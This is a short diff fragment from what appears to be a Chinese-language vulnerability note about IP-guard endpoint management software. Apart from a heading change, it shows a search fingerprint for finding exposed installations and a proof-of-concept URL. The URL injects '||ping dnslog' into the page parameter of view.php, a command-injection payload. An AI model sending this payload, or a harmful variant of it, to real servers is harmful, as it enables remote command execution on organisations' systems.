@@ -11,7 +11,7 @@ IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软
 "IP-guard" && icon_hash="2030860561"
 ```
 
-## poc
+## POC
 ```
 /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20dnslog
 ```
